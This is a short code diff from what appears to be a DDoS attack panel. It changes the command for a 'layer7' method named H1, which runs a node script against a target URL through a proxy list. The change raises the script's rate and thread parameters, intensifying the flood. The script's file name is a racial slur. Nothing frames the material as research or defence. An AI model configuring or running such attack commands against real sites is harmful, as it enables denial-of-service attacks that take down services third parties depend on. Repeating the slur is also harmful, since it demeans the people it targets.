@@ -44,7 +44,7 @@ let methods = {
             Type: 'layer7'
         },
         H1: {
-            Command: 'cd /root/.flash/ && node nigga.js GET {url} px.txt {time} 64 4',
+            Command: 'cd /root/.flash/ && node nigga.js GET {url} px.txt {time} 100 10',
             Type: 'layer7'
         }     
     },
